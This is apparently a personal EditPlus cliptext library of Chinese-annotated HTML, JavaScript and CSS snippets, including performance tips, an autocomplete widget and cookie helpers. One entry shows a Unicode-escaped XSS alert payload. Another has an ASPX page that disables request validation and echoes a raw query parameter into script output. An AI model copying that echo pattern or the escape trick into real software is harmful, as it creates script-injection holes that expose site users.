#TITLE=04.Microshaoft HTML/Script
#INFO
New Cliptext library
#SORT=y

#T=&# \u XSS HTML Javascript Encode
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title> new document </title>
		<meta name="generator" content="editplus" />
		<meta name="author" content="" />
		<meta name="keywords" content="" />
		<meta name="description" content="" />
	</head>
	<body>
		<script type="text/javascript" language="javascript">
			\u0064ocument.write('\u003cscript\u003ealert\u0028\u0022XSS \u0041ttack\u0022\u0029\u003c/script\u003e');
		</script>
		<a href="">&#9971;&#39281;&#39281;&#39281;&#;AS安师大的&#39281;&#39281;&#60;</a>
		<a href="">&#9971;&#39281;&#39281;&#39281;&#39281;&#39281;&#60;</a>
	</body>
</html>

#T=1行 javascript
[].forEach.call($$("*"),function(a){
  a.style.outline="1px solid #"+(~~(Math.random()*(1<<24))).toString(16);
});


[].forEach.call( $$('*'), function( element ) { /* 在这里修改颜色 */ element.style.backgroundColor="#"+(~~(Math.random()*(1<<24))).toString(16);});

function say(name) {
 console.log( this + ' ' + name );
}

say.call( 'hola', 'Mike' ); // 打印 'hola Mike'

(30).toString(); // "30"
(30).toString(10); // "30"
(30).toString(16); // "1e" 十六进制
(30).toString(2); // "11110" 二进制
(30).toString(36); // "u" 36是允许的最大参数值


parseInt("30"); // "30"
parseInt("30", 10); // "30"
parseInt("1e", 16); // "30"
parseInt("11110", 2); // "30"
parseInt("u", 36); // "30"


1 // 1 == 2^0
100 // 4 == 2^2
10000 // 16 == 2^4
1000000000000000000000000 // 16777216 == 2^24

/*
在这里并不关心取反，
我们指向获取整数部分。
因此我们还可以知道两次取反可以去掉一个浮点数的小数部分，
因此~~的作用相当于parseInt：
*/

var a = 12.34, // ~~a = 12
    b = -1231.8754, // ~~b = -1231
    c = 3213.000001 // ~~c = 3213
;

~~a == parseInt(a, 10); // true
~~b == parseInt(b, 10); // true
~~c == parseInt(c, 10); // true


~~a == 0|a == parseInt(a, 10)
~~b == 0|b == parseInt(b, 10)
~~c == 0|c == parseInt(c, 10)

#T==== !==
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<script type="text/javascript">
<!--
	var a = 1;
	var b = a;
	var b = "1";
	var e;
	//alert(a==b);
	//alert(a===b);
	alert(null == e)
	alert(a!==b);
	alert(1===1);
	var c = 1;
	var d = 1;
	alert(a===b==c===d);
//-->
</script>
</body>
</html>

#T=30个提高Web程序执行效率的好经验
尽量避免使用DOM。当需要反复使用DOM时，先把对DOM的引用存到JAVAScript本地变量里再使用。使用设置innerHTML的方法来替换document.createElement/appendChild()方 法。

eval()有问题，new Fuction()构造函数也是，尽量避免使用它们。

拒绝使用with语句。 它会导致当你引用这个变量时去额外的搜索这样的一个命名空间，with里的代码在编译时期是完全未知的。

使用for()循环替代for…in循 环。因为for…in循环在开始循环之前需要Script引擎创建一个含有所有可循环属性的 List，需要多检查一次。

把try-catch语句放在循环外面，不要放在循环里面，因为异常是很少发生的，放在外面避免每次都要执行 它们。
甚至圣经里都提到过这个 – 不要全局的。全局变量的生命周期贯穿整个脚本的生命周期，而本地变量的存在范围随着本地命名空间的销毁而消失。当在函数或其它地方引用一个全局变量时，脚 本引擎需要搜索整个全局命名空间。
fullName += 'John'; fullName += 'Holdings';执行速度快于fullName += 'John' + 'Holdings';

如果你需要把多个字符串连接起来，最好是把他们做成一个数组，然后调用join()方法实现这个操作。这种方式在生成HTML片段时尤其 有效。

对于简单的任务，最好使用基本操作方式来实现，而不是使用函数调用实现。例如val1 < val2 ? val1 : val2;执行速度快于Math.min(val1, val2);，类似的，myArr.push(newEle);慢于myArr[myArr.length] = newEle;

将函数的引用作为参数传递到setTimeout()和setInterval()里优于将函数名作为字符串参数传递（硬编码）。例如，setTimeout(“someFunc()”, 1000)执行效率慢于setTimeout(someFunc, 1000)

当进行遍历操作时避免使用DOM操作。通过像getElementsByTagName()这 种方法得到的DOM元素队列都是动态的；有可能在你还没有对它遍历完成时，它已经被改变。这有可能导致死循环。

当你对对象的成员（属性或方法）进行反复操作时，先存储对它们的引用。例如var getTags = document.getElementsByTagName; getTags(‘div’);

在任何的代码段里，在局部变量范围外存放一个这个局部变量的引用。例如
function foo(arr) {
var a = ‘something’;
 

//变量 ‘a’ 对于下面的一段就是范围外变量,这个变量的引用在很多情况下会有用处。
for (var i = 0, j = a, loopLen = arr.length; i < loopLen; i++) {
//do something
}
}

for(var i=0; i < someArray.length; i++) {…}的执行效率慢于for (var i=0, loopLen=someArray.length; i<loopLen; i++) {…}。

在HTTP头信息里加入缓存控制过期和最大存活时间标记。

优化CSS。要使用<link>方式，而不要使用@import方式。请参考这个优秀的文档http://www.slideshare.net/stubbornella/object-oriented-css

使用CSS技术来优化图片资源

用GZip方式压缩 .js 和 .css 文件。如果你使用的是Apache，在 .htaccess 里设置压缩方式，你的HTML, XML 和 JSON 也同时会被压缩。

AddOutputFilterByType DEFLATE text/html text/css text/plain text/xml application/x-javascript application/json

使用JavaScript压缩工具。除了使用YUI和JSMin外，你还可以试一试Google Closure http://closure-compiler.appspot.com/home (感谢: James Westgate, 一位读者)
优化每个页面上的各种资源，把它们拆分到各个子域上，这么它们就能够并行下载。请参考http://yuiblog.com/blog/2007/04/11/performance-research-part-4/
将CSS样式表放在页面的最顶端，这样能方便包括IE在内的浏览器进行解析。

尽量将DOM结构保持的越简单越好。DOM的体积会影响相关的操作效率，像查找， 遍历，DOM改动都有影响。document.getElementsByTagName(‘*’).length这 个值越小越好。

注意你使用的选择器。例如，如果你想获取一个ul下的直接子元素，使用jQuery(“ul > li”)而不要使用jQuery(“ul li”)
当切换元素的可见性时(display),请记住：element.css({display:none})的 速度快于element.hide() 和 element.addClass(‘myHiddenClass’)。 除非在一个循环里，我选择element.addClass(‘myHiddenClass’)， 这样会使代码更简洁 – 不要使用 inline CSS 和 JavaScript。

当你使用完对DOM的引用变量后，要把它置为NULL。

使用AJAX时，GET的执行效率高于POST。所以要尽量使用 GET 方式。只是要注意一点，IE只允许你用GET传送2K的数据。

小心使用脚本动画。没有硬件的支持，动画会执行的很慢。尽量避免使用那些没有实际价值的动画效果。

如果你的background-image对于这个图片的容器太小的话，请避免使 用background-repeat。如果你的背景图片需要来回填充很多次才能充满背景，那么将background-repeat属性设置成background-image 和repeat-x 或 repeat-y来 达到填充背景的效果的做法是不明智的，这种填充方式的效率特别的低。你应该尝试使用一个足够大的图片来做background-image并 且使用background-repeat: no-repeat。

布局时不要使用<table>。 <table>在浏览器完全把它画出来之前需要反复绘制好几次。因为DOM中<table>是很少见的一种之后输出的会影响之前输出的显示效果的元素。对于表格数据来说，你可 以使用table-layout:fixed; 这是一种更有效的现实算法，根据CSS 2.1技术说明，这种写法可以让表格一行一行的输出。

尽可能的使用原始JavaScript。限制JavaScript框架的使用。
#T=30个提高Web程序执行效率的好经验[转]
1.尽量避免使用DOM。当需要反复使用DOM时，先把对DOM的引用存到JavaScript本地变量里再使用。使用设置innerHTML的方法来替换document.createElement/appendChild()方 法。

2.eval()有问题，new Fuction()构造函数也是，尽量避免使用它们。

3.拒绝使用with语句。 它会导致当你引用这个变量时去额外的搜索这样的一个命名空间，with里的代码在编译时期是完全未知的。

4.使用for()循环替代for…in循 环。因为for…in循环在开始循环之前需要Script引擎创建一个含有所有可循环属性的 List，需要多检查一次。

5.把try-catch语句放在循环外面，不要放在循环里面，因为异常是很少发生的，放在外面避免每次都要执行 它们。

6.甚至圣经里都提到过这个 – 不要全局的。全局变量的生命周期贯穿整个脚本的生命周期，而本地变量的存在范围随着本地命名空间的销毁而消失。当在函数或其它地方引用一个全局变量时，脚 本引擎需要搜索整个全局命名空间。

7.fullName += 'John'; fullName += 'Holdings';执行速度快于fullName += 'John' + 'Holdings';

8.如果你需要把多个字符串连接起来，最好是把他们做成一个数组，然后调用join()方法实现这个操作。这种方式在生成HTML片段时尤其 有效。

9.对于简单的任务，最好使用基本操作方式来实现，而不是使用函数调用实现。例如val1 < val2 ? val1 : val2;执行速度快于Math.min(val1, val2);，类似的，myArr.push(newEle);慢于myArr[myArr.length] = newEle;

10.将函数的引用作为参数传递到setTimeout()和setInterval()里优于将函数名作为字符串参数传递（硬编码）。例如，setTimeout(“someFunc()”, 1000)执行效率慢于setTimeout(someFunc, 1000)

11.当进行遍历操作时避免使用DOM操作。通过像getElementsByTagName()这 种方法得到的DOM元素队列都是动态的；有可能在你还没有对它遍历完成时，它已经被改变。这有可能导致死循环。

12.当你对对象的成员（属性或方法）进行反复操作时，先存储对它们的引用。例如var getTags = document.getElementsByTagName; getTags(‘div’);

13.在任何的代码段里，在局部变量范围外存放一个这个局部变量的引用。例如
function foo(arr) {
var a = ‘something’;

//变量 ‘a’ 对于下面的一段就是范围外变量,这个变量的引用在很多情况下会有用处。

for (var i = 0, j = a, loopLen = arr.length; i < loopLen; i++) {

//do something

}

}

14.for(var i=0; i < someArray.length; i++) {…}的执行效率慢于for (var i=0, loopLen=someArray.length; i<loopLen; i++) {…}。

15.在HTTP头信息里加入缓存控制过期和最大存活时间标记。

16.优化CSS。要使用<link>方式，而不要使用@import方式。请参考这个优秀的文档http://www.slideshare.net/stubbornella/object-oriented-css

17.使用CSS技术来优化图片资源

18.用GZip方式压缩 .js 和 .css 文件。如果你使用的是Apache，在 .htaccess 里设置压缩方式，你的HTML, XML 和 JSON 也同时会被压缩。
AddOutputFilterByType DEFLATE text/html text/css text/plain text/xml application/x-javascript application/json

19.使用JavaScript压缩工具。除了使用YUI和JSMin外，你还可以试一试Google Closurehttp://closure-compiler.appspot.com/home (感谢: James Westgate, 一位读者)

20.优化每个页面上的各种资源，把它们拆分到各个子域上，这么它们就能够并行下载。请参考http://yuiblog.com/blog/2007/04/11/performance-research-part-4/

21.将CSS样式表放在页面的最顶端，这样能方便包括IE在内的浏览器进行解析。

22.尽量将DOM结构保持的越简单越好。DOM的体积会影响相关的操作效率，像查找， 遍历，DOM改动都有影响。document.getElementsByTagName(‘*’).length这 个值越小越好。

23.注意你使用的选择器。例如，如果你想获取一个ul下的直接子元素，使用jQuery(“ul > li”)而不要使用jQuery(“ul li”)

24.当切换元素的可见性时(display),请记住：element.css({display:none})的 速度快于element.hide() 和 element.addClass(‘myHiddenClass’)。 除非在一个循环里，我选择element.addClass(‘myHiddenClass’)， 这样会使代码更简洁 – 不要使用 inline CSS 和 JavaScript。

25.当你使用完对DOM的引用变量后，要把它置为NULL。

26.使用AJAX时，GET的执行效率高于POST。所以要尽量使用 GET 方式。只是要注意一点，IE只允许你用GET传送2K的数据。

27.小心使用脚本动画。没有硬件的支持，动画会执行的很慢。尽量避免使用那些没有实际价值的动画效果。

28.如果你的background-image对于这个图片的容器太小的话，请避免使 用background-repeat。如果你的背景图片需要来回填充很多次才能充满背景，那么将background-repeat属性设置成background-image 和repeat-x 或 repeat-y来 达到填充背景的效果的做法是不明智的，这种填充方式的效率特别的低。你应该尝试使用一个足够大的图片来做background-image并 且使用background-repeat: no-repeat。

29.布局时不要使用<table>。 <table>在浏览器完全把它画出来之前需要反复绘制好几次。因为DOM中<table>是很少见的一种之后输出的会影响之前输出的显示效果的元素。对于表格数据来说，你可 以使用table-layout:fixed; 这是一种更有效的现实算法，根据CSS 2.1技术说明，这种写法可以让表格一行一行的输出。

30尽可能的使用原始JavaScript。限制JavaScript框架的使用。
#T=aaa引用代码灰表格
<!-- 代码引用灰表格 -->
<table border="1" cellspacing="0" cellpadding="0"  bgcolor="#eeece1">
	<tr>
		<td>
<!-- begin code -->



<!-- end code -->
		</td>
	</tr>
</table>

#T=AutoComplete 输入建议
<!DOCTYPE HTML>
<html>
	<head>
		<meta charset="utf-8">
		<title>inputSuggest_0.1.js</title>
		<style type="text/css">
			body
				{
					margin : 0;
					padding :0;
				}
			input
				{
					width : 200px;
				}
			.suggest-container
				{
					border : 1px solid #C1C1C1;
					visibility : hidden;}
			.suggest-item
				{
					padding:3px 2px;
				}
			.suggest-active
				{
					background : #33CCFF;
					color : white;
					padding: 3px 2px;
				}
		</style>
		<script type="text/javascript">
		<!--
			/**
			 * JavaScript inputSuggest v0.1
			 * Copyright (c) 2010 snandy
			 * Blog: http://snandy.javaeye.com/
			 * QQ群: 34580561
			 * Date: 2010-09-25 
			 * 
			 * 
			 * new InputSuggest({
			 * 	  input 		HTMLInputElement 必选
			 * 	  data 			Array ['sina.cn','sina.com','2008.sina.com','vip.sina.com.cn'] 必选
			 * 	  containerCls	容器className
			 * 	  itemCls		容器子项className
			 * 	  activeCls		高亮子项className
			 * 	  width 		宽度设置 此项将覆盖containerCls的width
			 *    opacity		透明度设置 此项将覆盖containerCls的opacity
			 * });
			 */

			function InputSuggest(opt){
				this.win = null;
				this.doc = null;	
				this.container = null;
				this.items = null;
				this.input = opt.input || null;
				this.containerCls = opt.containerCls || 'suggest-container';
				this.itemCls = opt.itemCls || 'suggest-item';
				this.activeCls = opt.activeCls || 'suggest-active';
				this.width = opt.width;
				this.opacity = opt.opacity;
				this.data = opt.data || [];
				this.active = null;
				this.visible = false;
				this.init();
			}
			InputSuggest.prototype = {
				init: function(){
					this.win = window;
					this.doc = window.document;
					this.container = this.$C('div');
					this.attr(this.container, 'class', this.containerCls);				
					this.doc.body.appendChild(this.container);
					this.setPos();
					var _this = this, input = this.input;		

					this.on(input,'keyup',function(e){
						if(input.value==''){
							_this.hide();
						}else{
							_this.onKeyup(e);
						}
						
					});
					// blur会在click前发生，这里使用mousedown
					this.on(input,'blur',function(e){
						_this.hide();			
					});
					this.onMouseover();
					this.onMousedown();
					
				},
				$C: function(tag){
					return this.doc.createElement(tag);
				},
				getPos: function (el){
					var pos=[0,0], a=el;
					if(el.getBoundingClientRect){
						var box = el.getBoundingClientRect();
						pos=[box.left,box.top];
					}else{
						while(a && a.offsetParent){
							pos[0] += a.offsetLeft;
							pos[1] += a.offsetTop;
							a = a.offsetParent
						}			
					}
					return pos;
				},	
				setPos: function(){
					var input = this.input, 
						pos = this.getPos(input), 
						brow = this.brow, 
						width = this.width,
						opacity = this.opacity,
						container = this.container;
					container.style.cssText =
						'position:absolute;overflow:hidden;left:' 
						+ pos[0] + 'px;top:'
						+ (pos[1]+input.offsetHeight) + 'px;width:'
						// IE6/7/8/9/Chrome/Safari input[type=text] border默认为2，Firefox为1，因此取offsetWidth-2保证与FF一致
						+ (brow.firefox ? input.clientWidth : input.offsetWidth-2) + 'px;';
					if(width){
						container.style.width = width + 'px';
					}
					if(opacity){
						if(this.brow.ie){
							container.style.filter = 'Alpha(Opacity=' + opacity * 100 + ');';
						}else{
							container.style.opacity = (opacity == 1 ? '' : '' + opacity);
						}			
					}
				},
				show: function(){
					this.container.style.visibility = 'visible';
					this.visible = true;
				},
				hide: function(){
					this.container.style.visibility = 'hidden';
					this.visible = false;	
				},
				attr: function(el, name, val){
					if(val === undefined){
						return el.getAttribute(name);
					}else{
						el.setAttribute(name,val);
						name=='class' && (el.className = val);			
					}
				},
				on: function(el, type, fn){
					el.addEventListener ? el.addEventListener(type, fn, false) : el.attachEvent('on' + type, fn);
				},
				un: function(el, type, fn){
					el.removeEventListener ? el.removeEventListener(type, fn, false) : el.detachEvent('on' + type, fn);
				},
				brow: function(ua){
					return {
						ie: /msie/.test(ua) && !/opera/.test(ua),
						opera: /opera/.test(ua),
						firefox: /firefox/.test(ua)
					};
				}(navigator.userAgent.toLowerCase()),
				onKeyup: function(e){
					var container = this.container, input = this.input, iCls = this.itemCls, aCls = this.activeCls;
					if(this.visible){
						switch(e.keyCode){
							case 13: // Enter
								if(this.active){
									input.value = this.active.firstChild.data;
									this.hide();
								}					
								return;
							case 38: // 方向键上
								if(this.active==null){
									this.active = container.lastChild;
									this.attr(this.active, 'class', aCls);
									input.value = this.active.firstChild.data;
								}else{
									if(this.active.previousSibling!=null){
										this.attr(this.active, 'class', iCls);
										this.active = this.active.previousSibling;
										this.attr(this.active, 'class', aCls);
										input.value = this.active.firstChild.data;
									}else{
										this.attr(this.active, 'class', iCls);
										this.active = null;
										input.focus();
										input.value = input.getAttribute("curr_val");
									}
								}
								return;
							case 40: // 方向键下
								if(this.active==null){
									this.active = container.firstChild;
									this.attr(this.active, 'class', aCls);
									input.value = this.active.firstChild.data;
								}else{			
									if(this.active.nextSibling!=null){
										this.attr(this.active, 'class', iCls);
										this.active = this.active.nextSibling;
										this.attr(this.active, 'class', aCls);
										input.value = this.active.firstChild.data;
									}else{
										this.attr(this.active, 'class', iCls);
										this.active = null;
										input.focus();
										input.value = input.getAttribute("curr_val");
									}
								}
								return;

						}
					
					}	
					if(e.keyCode==27){ // ESC键
						this.hide();
						input.value = this.attr(input,'curr_val');
						return;
					}	
					if(input.value.indexOf('@')!=-1){return;}
					this.items = [];
					
					if(this.attr(input,'curr_val')!=input.value){
						this.container.innerHTML = '';
						for(var i=0,len=this.data.length;i<len;i++){
							var item = this.$C('div');
							this.attr(item, 'class', this.itemCls);
							item.innerHTML = input.value + '@' + this.data[i];
							this.items[i] = item;
							this.container.appendChild(item);
						}
						this.attr(input,'curr_val',input.value);		
					}

					this.show();
								
				},
				onMouseover: function(){
					var _this = this, icls = this.itemCls, acls = this.activeCls;
					this.on(this.container,'mouseover',function(e){
						var target = e.target || e.srcElement;
						if(target.className == icls){
							if(_this.active){
								_this.active.className = icls;					
							}
							target.className = acls;
							_this.active = target;

						}
					});
				},
				onMousedown: function(){
					var _this = this;	
					this.on(this.container,'mousedown',function(e){
						var target = e.target || e.srcElement;
						_this.input.value = target.innerHTML;
						_this.hide();
					});
				}
			}	


		//-->
		</script>
		
		<script type="text/javascript">
			
			window.onload = function()
			{
				var sinaSuggest = new InputSuggest
				(
					{
						input: document.getElementById('sina'),
						data: ['sina.cn','sina.com','vip.sina.com.cn','2008.sina.com','263.sina.com']
					}
				);
				var sohuSuggest = new InputSuggest
				(
					{
						width: 300,
						opacity: 0.3,
						input: document.getElementById('sohu'),
						data: ['sohu.com','sogou.com','chinaren.com','vip.sohu.com','sohu.net','2008.sohu.com','sms.sohu.com']
					}
				);
				
			}
		</script>
	</head>
	<body>
		<div style="width:400px;margin:30px auto;text-align:center;">
			<label>新浪</label>
			<input type="text" id="sina"/>
			<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
			<label>搜狐</label>
			<input type="text" id="sohu"/>
		</div>
	</body>
</html>

#T=baidu search
<table width=100% border=1>
<TR align="center">
<td colspan=2>
<a href="http://news.baidu.com">资讯</a>
网页
<a href="http://post.baidu.com">贴吧</a>
<a href="http://zhidao.baidu.com">知道</a>
<a href="http://mp3.baidu.com">MP3</a>
<a href="http://image.baidu.com">图片</a>
<a href="http://www.baidu.com/more/index.html">更多&gt;&gt;</a>
</td>
</TR>
	<tr>
		<td>
			<form name=f action=http://www.baidu.com/s>
				<input type=text name=wd size=25 maxlength=100>
				<input type=hidden name=cl value=3>
				<input type=submit value=百度搜索>
			</form>
		</td>
		<td>
			<a href=/search/jiqiao.html>
				搜索帮助
			</a>
			<br>
			<a href=/gaoji/advanced.html>
				高级搜索
			</a>
		</td>
	</tr>
</table>
#T=base64 解码
function base64_decode(data){
    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,ac = 0,dec = "",tmp_arr = [];
    if (!data) { return data; }
    data += '';
    do { 
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;
        if (h3 == 64) {
            tmp_arr[ac++] = String.fromCharCode(o1);
        } else if (h4 == 64) {
            tmp_arr[ac++] = String.fromCharCode(o1, o2);
        } else {
            tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);
        }
    } while (i < data.length);
    dec = tmp_arr.join('');
    dec = utf8_decode(dec);
    return dec;
}
#T=call
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
<input type="text" id="myText"   value="input text">
<script>
	function Obj(){this.value="对象！";}
	var value="global 变量";
	function Fun1(){alert(this.value);}
	window.Fun1();   //global 变量
	Fun1.call(window);  //global 变量
	Fun1.call(document.getElementById('myText'));  //input text
	Fun1.call(new Obj());   //对象！
</script>
<script>
   var func=new function(){this.a="func"}
	var myfunc=function(x){
		var a="myfunc";
		alert(this.a);
		alert(x);
	}
	myfunc.call(func,"var");
</script>
</body>
</html>

#T=console.log
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<script type="text/javascript">
//变量
var i = 'I am a string';
console.log('变量：',i);

//数组
var arr = [1,2,3,4,5];
console.log('数组：',arr);

//对象
var obj1 = {
    key1 : 'value1',
    key2 : 'value2',
    key3 : 'value3'
};
var obj2 = {
    key6 : 'value4',
    key5 : 'value5',
    key4 : 'value6'
};
var obj3 = {
    key9 : 'value7',
    key8 : 'value8',
    key7 : 'value9'
};

console.log('对象：',obj1);
//对象数组
var objArr1 = [obj1,obj2,obj3];
var objArr2 = [[obj1],[obj2],[obj3]];

console.log('对象数组1：',objArr1);
console.log('对象数组1：',objArr2);
</script>
</body>
</html>

#T=contenteditable
<!DOCTYPE html>
<html>
	<head>
	<title>Editable WYSIWYG</title>
		<link href="bootstrap.css" rel="stylesheet">
		<link href="font-awesome.css" rel="stylesheet">
		<style>
			#editor {
				resize:vertical; 
				overflow:auto; 
				border:1px solid silver; 
				border-radius:5px; 
				min-height:100px;
				box-shadow: inset 0 0 10px silver;
				padding:1em;
			}
		</style>
	</head>
	<body>
		<div class="content">
			<div class="container-fluid">
				<div id='pad-wrapper'>
					<div id="editparent">
						<div id='editControls' class='span12' style='text-align:center; padding:5px;'>
							<div class='btn-group'>
								<a class='btn' data-role='undo' href='#'><i class='icon-undo'></i></a>
								<a class='btn' data-role='redo' href='#'><i class='icon-repeat'></i></a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='bold' href='#'><b>Bold</b></a>
								<a class='btn' data-role='italic' href='#'><em>Italic</em></a>
								<a class='btn' data-role='underline' href='#'><u><b>U</b></u></a>
								<a class='btn' data-role='strikeThrough' href='#'><strike>abc</strike></a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='justifyLeft' href='#'><i class='icon-align-left'></i></a>
								<a class='btn' data-role='justifyCenter' href='#'><i class='icon-align-center'></i></a>
								<a class='btn' data-role='justifyRight' href='#'><i class='icon-align-right'></i></a>
								<a class='btn' data-role='justifyFull' href='#'><i class='icon-align-justify'></i></a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='indent' href='#'><i class='icon-indent-right'></i></a>
								<a class='btn' data-role='outdent' href='#'><i class='icon-indent-left'></i></a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='insertUnorderedList' href='#'><i class='icon-list-ul'></i></a>
								<a class='btn' data-role='insertOrderedList' href='#'><i class='icon-list-ol'></i></a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='h1' href='#'>h<sup>1</sup></a>
								<a class='btn' data-role='h2' href='#'>h<sup>2</sup></a>
								<a class='btn' data-role='p' href='#'>p</a>
							</div>
							<div class='btn-group'>
								<a class='btn' data-role='subscript' href='#'><i class='icon-subscript'></i></a>
								<a class='btn' data-role='superscript' href='#'><i class='icon-superscript'></i></a>
							</div>
						</div>
						<div id='editor' class='span12' style='' contenteditable>
							<h1>This is a title!</h1>
							<p>This is just some example text to start us off</p>
						</div>
					</div>
				</div>
			</div>
		</div>
		<script src="jquery.min.js"></script>
		<script src="bootstrap.min.js"></script>
		<script>
 
			$(function() {
				$('#editControls a').click(function(e) {
					switch($(this).data('role')) {
						case 'h1':
						case 'h2':
						case 'p':
							document.execCommand('formatBlock', false, '<' + $(this).data('role') + '>');
							break;
						default:
							document.execCommand($(this).data('role'), false, null);
							break;
					}
					 
				})
			});
		</script>
	</body>
</html>
#T=Cookie
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
 </head>

 <body>
	<script type="text/javascript" language="javascript" src="">
		// Create a cookie with the specified name and value.
		function SetCookie(sName, sValue)
		{
			document.cookie = sName + "=" + escape(sValue);
			// Expires the cookie in one month
			var date = new Date();
			date.setMonth(date.getMonth()+1);
			document.cookie += ("; expires=" + date.toUTCString()); 
		}
		//This next example retrieves the value of a cookie with a specified name.
		//Copy Code// Retrieve the value of the cookie with the specified name.
		function GetCookie(sName)
		{
			// cookies are separated by semicolons
			var aCookie = document.cookie.split("; ");
			for (var i=0; i < aCookie.length; i++)
			{
				// a name/value pair (a crumb) is separated by an equal sign
				var aCrumb = aCookie[i].split("=");
				if (sName == aCrumb[0]) 
				{
					return unescape(aCrumb[1]);
				}
			}
			// a cookie with the requested name does not exist
			return null;
		}
		//This last example deletes a cookie by setting its expires attribute to a past date. A cookie deleted in this manner might not be removed immediately by the browser.
		//Copy Code// Delete the cookie with the specified name.
		function DelCookie(sName)
		{
			document.cookie = sName + "=; expires=Fri, 31 Dec 1999 23:59:59 GMT;";
		}
	</script>
</body>
</html>

#T=Cross domain Transfer Data
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<meta name="generator" content="editplus" />
	<meta name="author" content="" />
	<meta name="keywords" content="" />
	<meta name="description" content="" />

	<script type="text/javascript">

	function TransferData(x)
	{
		//alert(x + "!!!!!!!!!");
		var Url = "http://test.v20.asp.net/a.aspx?aa=" + x;
		var ScriptName = "TempScript";

		var head= document.getElementsByTagName("head").item(0);
		var old = document.getElementById(ScriptName);
		if (old)
		{
			head.removeChild(old);
		}

		var script = document.createElement("SCRIPT");
		script.src = Url;
		script.defer = true;
		script.type = "text/javascript";
		script.id = ScriptName;
		head.appendChild(script);
	}
	//-->
	</script>
</head>

<body>
<input type="text" name="t1" />
<input type="button" onclick="TransferData(t1.value)" />
</body>
</html>
aspx:
	<%@ Page ValidateRequest="false"  %>

	<%@ Import Namespace="System.Data" %>
	<%@ Import Namespace="System.Data.SqlClient" %>
	<%@ Import Namespace="System.Security.Principal" %>
	<%@ Import Namespace="System.IO" %>
	<script language="C#" runat="server">
	protected void Page_Load(object sender, EventArgs ea) 
	{

		Response.ContentType = "text/x-javascript";
		Response.Write("alert('" + Request.QueryString["aa"] + "')");
	}
	
	</script>

#T=css div headerbar footerbar
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
 <style>
body
{
 background-image:url(text.txt); /* for IE6 */
 background-attachment:fixed;
}
^#HeaderBar
{
 background-color: #FF0000;
 z-index: 999;
 position: fixed;
 left: 0;
 <!-- bottom: 100; -->
 top: 0;
 width: 100%;
 _position: absolute; /* for IE6 */
 overflow: visible;
}
^#FooterBar
{
 background-color: #096;
 z-index: 999;
 position: fixed;
 <!-- bottom: 0; -->
 left: 0;
 width: 100%;
 _position: absolute; /* for IE6 */
 _top: expression(documentElement.scrollTop + documentElement.clientHeight-this.offsetHeight); /* for IE6 */
 overflow: visible;
}
^#LeftBar
{
 background-color: #0000FF;
 z-index: 999;
 position: fixed;
 left: 0;
 
 right: 100
 top: 0;
 width: 100;
 _position: absolute; /* for IE6 */
 overflow: visible;
}
^#RightBar
{
 background-color: #096;
 z-index: 999;
 position: fixed;
 <!-- bottom: 0; -->
 left: 0;
 width: 100;
 top: 0;
 _position: absolute; /* for IE6 */
 overflow: visible;
}
 </style>
 </head>
 <body>
<div id="FooterBar">footer</div><div id="LeftBar">left</div>
<div id="HeaderBar">header</div>
 撒打算打算
 </body>
</html>
#T=css3 15种基础的可以直接使用的CSS3样式
http://www.cnblogs.com/cgtianyi/archive/2013/04/10/3011502.html

